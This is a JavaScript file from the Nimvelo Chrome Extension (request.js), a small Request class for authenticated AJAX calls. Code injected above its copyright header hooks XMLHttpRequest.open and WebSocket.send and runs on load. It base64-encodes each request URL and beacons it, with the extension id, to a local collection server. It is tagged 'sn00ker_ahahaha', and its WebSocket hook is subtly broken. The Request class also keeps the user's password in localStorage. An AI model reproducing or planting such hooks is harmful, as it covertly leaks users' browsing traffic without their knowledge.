function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Nimvelo Chrome Extension - request.js
// Copyright (c) 2010 - 2015 Sipcentric Ltd. Licensed under the MIT license: http://www.opensource.org/licenses/mit-license.php

// var hdl = new Request("/customers/me/calls");

// hdl.success(function(response, status){
//   console.log(response);
// });

// hdl.failed(function(response, status){
//   console.log(response);
// });

// hdl.loading(function(state){
//   loadingState(state);
// });

// hdl.go();

// Request class

function Request(resource) {

  this.resource = resource;

  this.type = "GET"; // Default to GET

  this.base = localStorage['baseURL'];
  this.username = localStorage["loginUsername"];
  this.password = localStorage["loginPassword"];
  this.params = {};
  this.data = {};

}

Request.prototype.success = function(callback) {
  this.success = callback;
}

Request.prototype.failed = function(callback) {
  this.failed = callback;
}

Request.prototype.loading = function(callback) {
  this.loading = callback;
}

Request.prototype.go = function() {

  console.log("[Request] " + "Sending request");

  var success = this.success;
  var failed = this.failed;
  var loading = this.loading;

  var username = this.username;
  var password = this.password;
  var params = this.params;
  var type = this.type

  if (! $.isEmptyObject(this.data)) {
    var data = JSON.stringify(this.data);
  }

  var url = this.base + this.resource;

  if (! $.isEmptyObject(params)) {
    var url = url + "?" + decodeURIComponent($.param(params));
  }

  if (loading) {
    loading(true);
  }

  $.ajax({

    url: url,
    type: type,
    data: data,
    processData: false,
    dataType: "json",
    contentType: "application/json",
    timeout: 10000,

    beforeSend: function(xhr) {
      xhr.setRequestHeader("Authorization", "Basic " + btoa(username + ":" + password));
    }

  }).done(function(response) {

    if (loading) {
      loading(false);
    }

    if (success) {
      success(response);
    }

    return true;

  }).error(function(response) {

    if (loading) {
      loading(false);
    }

    try {
      var data = JSON.parse(response['responseText']);
    } catch(err) {

      //console.log("[Request] JSON encodes failed on response");
      var data = response['responseText'];

    }

    if (failed) {
      failed(data, response['status']);
    }

    return false;

  });

};

Request.prototype.page = function(value) {
  this.params['page'] = value;
}

Request.prototype.pageSize = function(value) {
  this.params['pageSize'] = value;
}
